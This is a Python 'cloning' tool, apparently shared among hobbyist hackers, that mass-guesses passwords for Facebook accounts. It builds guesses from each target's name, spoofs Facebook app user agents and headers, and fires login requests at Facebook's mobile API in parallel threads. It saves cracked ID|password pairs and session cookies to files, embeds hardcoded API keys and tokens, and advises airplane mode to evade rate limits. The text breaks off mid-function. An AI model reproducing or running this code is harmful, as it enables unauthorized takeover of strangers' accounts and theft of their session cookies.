#──────────────{ IMPORT }──────────────#
import os,bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,requests,httpx,re
from bs4 import BeautifulSoup
from os import path
import os,base64,zlib,pip,urllib
import requests,bs4,mechanize,httpx
from os import system as clr
from bs4 import BeautifulSoup as sop
from pip._vendor import requests as requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#________________ IMPORT ______________#
import os,platform,time,getpass
from time import sleep as slp
from concurrent.futures import ThreadPoolExecutor as ted
import uuid
import random 
import httpx
import json
import sys
print('\x1b[1;92m✔ Join Whatsap Group')
os.system('xdg-open https://chat.whatsapp.com/EsOBpjtmRdA5nYMCEDir6S')
#________________ BIT ______________#
bit = platform.architecture()[0]
#________________ LOOP ______________#
loop=0;oks=[];cps=[]
#________________ COLOUR ______________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m';P = '\x1b[38;5;146m';T = "\x1b[1;95m"
#──────────────{ LOOP }──────────────#
loop = 0;oks = [];cps = [];id = []
#──────────────{ COLOUR }──────────────#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m'
#──────────────{ LINEX }──────────────#
def clear():os.system('clear');print(logo)
def linex():print(f'{A}─────────────────────────────────────────────────')
#──────────────{ UA-FOR-RANDOM }──────────────#
def sawg():
	model = random.choice(["Redmi 6","Redmi 7","Redmi 8","Redmi 5","Redmi 4","Redmi 3","Redmi 2"])
	bal = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+f";[FBAN/FB4A;FBAV/451.0.0.45.109;FBBV/449217850;FBDM/"+"{density=2.75,width=1080,height=2168}"+f";FBLC/en_US;FBRV/441815108;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/{model};FBSV/5.1.1;FBOP/1;FBCA/arm64-v8a:;]"
	return bal


def fex():
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fbbv = str(random.randint(10000000, 66666666))
	fbrv = str(random.randint(000000000,999999999))
	density = random.choice(['3.5'])
	width = random.choice(["1440"])
	height = random.choice(["2759"])
	ua = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/U.S. Cellular;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-N975U;FBSV/10;FBOP/1;FBCA/arm64-v8a:armeabi;]"
	return ua

def sex():
	fban = random.choice(["FB4A"])
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fbbv = str(random.randint(10000000, 66666666))
	density = random.choice(['3.0','2.0'])
	width = random.choice(["1920","720"])
	height = random.choice(["1080","1344"])
	fbcr = random.choice(['Nepal_Telecom', 'Banglalink', 'Robi', 'Grameenphone', 'Airtel','Metro by T-Mobile'])
	fblc = random.choice(["en_US", "en_GB"])
	fbbd = 'samsung','motorola'
	fbpn = random.choice(["com.facebook.adsmanager", "com.facebook.lite", "com.facebook.orca", "com.facebook.katana", "com.facebook.mlite"])
	fbsv = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	fbmf = 'samsung','motorola'
	build = random.choice(['SKQ1.210216.001','RKQ1.211103.002','PCB29.73-65-3'])
	fbdv = random.choice(["GT-I9505","moto e6"])
	END = f"[FBAN/{str(fban)};FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/{str(fblc)};FBCR/{str(fbcr)};FBMF/{str(fbmf)};FBBD/{str(fbbd)};FBPN/{str(fbpn)};FBDV/{str(fbdv)};FBSV/{str(fbsv)};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
	ua = f'Davik/2.1.0 (Linux; U; Android {str(fbsv)}; {str(fbdv)} Build/'+str(build)+') '+END
	ua =f'Mozilla/5.0 (Linux; Android {str(fbsv)}; {str(fbdv)} Build/'+str(build)+') '+END
	ua=f'Mozilla/3.0 (Linux; Android {str(fbsv)}; {str(fbdv)} Build/'+str(build)+') '+END
	return ua 
	
	
	
def baby():
	MOBILE_VERSION = f"{random.randint(4, 12)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	MOBILE_MODEL = random.choice(["SM-N975U"])
	BUILD = random.choice(["QP1A"])
	BUILD_VERSION = f'{random.randint(111111, 999999)}.{random.randint(111,999)}'
	FBBV = str(random.randint(10000000, 66666666))
	DENSITY = random.choice(['3.5'])
	WIDTH = random.choice(["1440"])
	HEIGHT = random.choice(["2759"])
	FB_VERSION = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	FBLC = random.choice(["cs_CZ","en_GB","en_US","lt_LT","pl_PL","id_ID","ru_RU","pt_PT","he_IL","hi_IN","nl_NL"," it_IT","en_IN","es_ES","en_PK"])
	FBRV = str(random.randint(000000000,999999999))
	FBCR = random.choice(["Tele2You","Telenor","FASTWEB","Banglalink","Sprint","Jazz","Vodafone IN","Vi India","Tele2 LT","Jio 4G","EE","Oi","MtelBG","AT&amp-T","Ufone","Azercell"])
	FBMF = 'samsung'
	FBBD = random.choice(['samsung'])
	FBPN = random.choice(["com.facebook.orca"])
	FBOP = random.choice(["0"])
	FBCA = random.choice(["arm64-v8a:Grameenphone;"])
	END = f"[FBAN/FB4A;FBAV/{FB_VERSION}/FBBV/{FBBV};FBDM/{{density={DENSITY},width={WIDTH},height={HEIGHT}}};FBLC/{FBLC};FBRV/{FBRV};FBCR/{FBCR};FBMF/{FBMF};FBBD/{FBBD};FBPN/{FBPN};FBDV/{MOBILE_MODEL};FBSV/{MOBILE_VERSION};FBOP/{FBOP};FBCA/{FBCA}]"
	OMG = f"Dalvik/2.1.0 Linux; U; Android {MOBILE_VERSION}; {MOBILE_MODEL} Build/QP1A.{BUILD_VERSION})"+END
	return OMG 	
#──────────────{ LOGO }──────────────#
logo = f"""
{A} 
     ██████ ██    ██ ██████  ███████ ██████  
    ██       ██  ██  ██   ██ ██      ██   ██ 
    ██        ████   ██████  █████   ██████  
    ██         ██    ██   ██ ██      ██   ██ 
     ██████    ██    ██████  ███████ ██   ██                                                                                  
{A}─────────────────────────────────────────────────
{A}|✔| OWNER   : CYBER \n{A}|✔| TOOL    : FILE/RANDOM\n{A}|✔| VERSION : 0.1.5\n{A}─────────────────────────────────────────────────"""
#________________ KEY ______________#
os.system('clear');print(logo)
attemps = 0
while attemps < 12345677901:
    username = input(f'{S}={T}[{G}≣{T}]{S}={A} YOUR KEY :{G} ')
    if username =='5547':
    	print(f'----------------------------------');break
    else:
    	print(f'{S}={T}[{G}≣{T}]{S}={A} WRONG KEY ');exit()
#________________ MAIN-MENU ______________#
def menu():
    clear()
    print(f"{A}|1| FILE CLONING");print(f"{A}|2| RANDOM CLONING");print(f"{A}|3| Join Fb Group ");print(f"{A}|4| EXIT CLONING");linex();option = input(f'{A}|?| CHOICE : ')
    if option in ['A','1']:__Filex__()
    elif option in ['B','2']:__Randmx__()
    elif option in ['B','3']:
    	os.system("xdg-open https://facebook.com/groups/413977624604293/");menu()    
    elif option in ['C','4']:exit()
    else:
        print(f'\n{A}|=| OPTION FOUND');menu()
#──────────────{ FILE }──────────────#
def __Filex__():
    clear()
    print(f"{A}|=| EXAMPLE : /sdcard/File.txt ");linex();dfile = input(f'{A}|?| CHOICE  : ')
    try:
        dx = open(dfile,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{A}|=| FILE NOT FOUND...');time.sleep(1);__Filex__()
    clear()
    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");linex();methodx = input(f'{A}|?| CHOICE : ')
    dplist = []
    try:
        clear()
        pass_lmit = int(input(f'{A}|?| PASSWORD LIMIT : '))
    except:
        pass_lmit =1
    clear()
    print(f"{A}|=| EXAMPLE : firstlast | first123 |ETC| ");linex()
    for i in range(pass_lmit):
        dplist.append(input(f'{A}|=| PASSWORD NO.{i+1} :{G} '))
    with ThreadPool(max_workers=30) as CYBERx:
        clear();total_ids = str(len(dx))
        print(f"{A}|=| FILE UID {G}|{A} PASSWORD :{G} {total_ids} {G}|{Y} {pass_lmit} ");print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
        for user in dx:
            ids,names = user.split('|')
            passlist = dplist
            if methodx in ['1']:CYBERx.submit(filemethod1,ids,names,passlist)
            if methodx in ['2']:CYBERx.submit(filemethod2,ids,names,passlist)
            if methodx in ['3']:CYBERx.submit(filemethod3,ids,names,passlist)
    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
#──────────────{ FILE-METHOD-M1 }──────────────#
def filemethod1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;92m|CYBER-M1| %s|\033[1;92mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                                android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                                facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
                                fbbv = str(random.randint(10000000, 99999999))
                                fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                                width = random.randint(720, 1440)
                                height = random.randint(1080, 2560)
                                fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                                fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;]','[FBAN/Orca-Android;FBAV/286.0.0.21.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/250669427;FBCR/T-Mobile;FBMF/LGE;FBBD/lge;FBDV/LG-H901;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2392};FB_FW/1;] FBBK/1','[FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "account_recovery",
                                        'error_detail_type':'button_with_disabled',
                                        'format':'json',
                                        'sim_serials': "['80973453345210784798']",
                                        'openid_flow': 'android_login',
                                        'openid_provider': 'google',
                                        'openid_emails': "['01710940017']",
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
                                        'generate_machine_id':'1',
                                        "family_device_id": str(uuid.uuid4()),
                                        "advertiser_id": str(uuid.uuid4()),
                                        "locale":"fr_MA","client_country_code":"MA",
                                        "device_id": str(uuid.uuid4()),
                                        "method": "auth.login",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "AuthOperations$PasswordAuthOperation"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'Host': 'graph.facebook.com',
                                        'x-fb-sim-hni':'45204',
                                        'X-FB-Connection-Type': 'MOBILE.LTE',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':baby(),
                                        'x-fb-net-hni':'45201',
                                        'x-fb-device-group': '5120',
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'X-FB-Client-IP': 'True',
                                        'X-FB-Server-Cluster': 'True',
                                        'x-fb-friendly-name':'authenticate',
                                        'X-FB-Request-Analytics-Tags': 'graphservice',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                             
                                        print('\r\r\033[1;92m|CYBER-OK| '+ids+' | '+pas+'\033[1;97m')
                                                         
                                        #------[OK IDS]------#
                                        #print("\033[1;33m <[BISCUT-🍪]> :\033[1;33m "+cookie)                                                   
                                        open('/sdcard/CYBER_m1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/CYBER_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        oks.append(ids)
                                        Elite(ids,pas,ckkk)
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                             #   print('\r\r\033[30;1m|CYBER-CP😔| '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/CYBER-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/CYBER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass

#──────────────{ FILE-METHOD-M2 }──────────────#
def filemethod2(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;92m|CYBER-M2| %s|\033[1;92mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                                android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                                facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
                                fbbv = str(random.randint(10000000, 99999999))
                                fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                                width = random.randint(720, 1440)
                                height = random.randint(1080, 2560)
                                fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                                fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;]','[FBAN/Orca-Android;FBAV/286.0.0.21.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/250669427;FBCR/T-Mobile;FBMF/LGE;FBBD/lge;FBDV/LG-H901;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2392};FB_FW/1;] FBBK/1','[FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "account_recovery",
                                        'error_detail_type':'button_with_disabled',
                                        'format':'json',
                                        'sim_serials': "['80973453345210784798']",
                                        'openid_flow': 'android_login',
                                        'openid_provider': 'google',
                                        'openid_emails': "['01710940017']",
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
                                        'generate_machine_id':'1',
                                        "family_device_id": str(uuid.uuid4()),
                                        "advertiser_id": str(uuid.uuid4()),
                                        "locale":"fr_MA","client_country_code":"MA",
                                        "device_id": str(uuid.uuid4()),
                                        "method": "auth.login",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "AuthOperations$PasswordAuthOperation"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'Host': 'graph.facebook.com',
                                        'x-fb-sim-hni':'45204',
                                        'X-FB-Connection-Type': 'MOBILE.LTE',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':baby(),
                                        'x-fb-net-hni':'45201',
                                        'x-fb-device-group': '5120',
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'X-FB-Client-IP': 'True',
                                        'X-FB-Server-Cluster': 'True',
                                        'x-fb-friendly-name':'authenticate',
                                        'X-FB-Request-Analytics-Tags': 'graphservice',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                             
                                        print('\r\r\033[1;92m|CYBER-OK| '+ids+' | '+pas+'\033[1;97m')
                                                         
                                        #------[OK IDS]------#
                                        #print("\033[1;33m <[BISCUT-🍪]> :\033[1;33m "+cookie)                                                   
                                        open('/sdcard/CYBER_m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/CYBER_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        oks.append(ids)
                                        Elite(ids,pas,ckkk)
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                             #   print('\r\r\033[30;1m|CYBER-CP😔| '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/CYBER-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/CYBER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass

#──────────────{ FILE-METHOD-M3 }──────────────#
def filemethod3(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;92m|CYBER-M3| %s|\033[1;92mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                                android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                                facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
                                fbbv = str(random.randint(10000000, 99999999))
                                fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                                width = random.randint(720, 1440)
                                height = random.randint(1080, 2560)
                                fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                                fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;]','[FBAN/Orca-Android;FBAV/286.0.0.21.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/250669427;FBCR/T-Mobile;FBMF/LGE;FBBD/lge;FBDV/LG-H901;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2392};FB_FW/1;] FBBK/1','[FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "account_recovery",
                                        'error_detail_type':'button_with_disabled',
                                        'format':'json',
                                        'sim_serials': "['80973453345210784798']",
                                        'openid_flow': 'android_login',
                                        'openid_provider': 'google',
                                        'openid_emails': "['01710940017']",
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
